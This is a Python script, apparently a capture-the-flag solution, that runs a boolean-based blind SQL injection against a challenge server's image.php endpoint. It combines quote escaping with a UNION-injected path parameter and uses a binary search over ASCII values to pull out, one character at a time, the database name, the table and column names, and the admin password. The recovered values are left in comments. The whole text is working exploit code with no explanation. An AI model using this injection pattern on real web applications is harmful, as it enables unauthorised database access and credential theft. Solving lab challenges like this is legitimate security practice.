import requests

url = "http://a998c1db-bd67-4cb9-8d25-d02ddddea1c0.node3.buuoj.cn/image.php?id=-1%\\0'&path=%20union%20select%20*%20from%20images%20where%20id=1%20and "
temp = ''
for i in range(1, 70):
    print("round:" + str(i))
    low = 0
    high = 126
    while (low <= high):
        mid = (low + high) / 2
        database = "select database()"  # ciscn
        table = "select group_concat(table_name) from information_schema.tables where table_schema=database()"  # images,users
        column = "select group_concat(column_name) from information_schema.columns where table_name=0x7573657273"  # username,password
        flag = "select group_concat(password) from users where username=0x61646d696e"
        payload = "(ascii(substr((" + flag + ")," + str(i) + ",1)))>" + str(mid) + " %23"  # username: admin password: eec095f606f771e1f54a
        payload = url + payload
        result = requests.get(payload)
        if (len(result.content) > 0):
            low = mid + 1
        else:
            high = mid - 1

    temp = temp + chr(int(round((low + high + 1) / 2)))
    print(temp.ljust(50, '*'))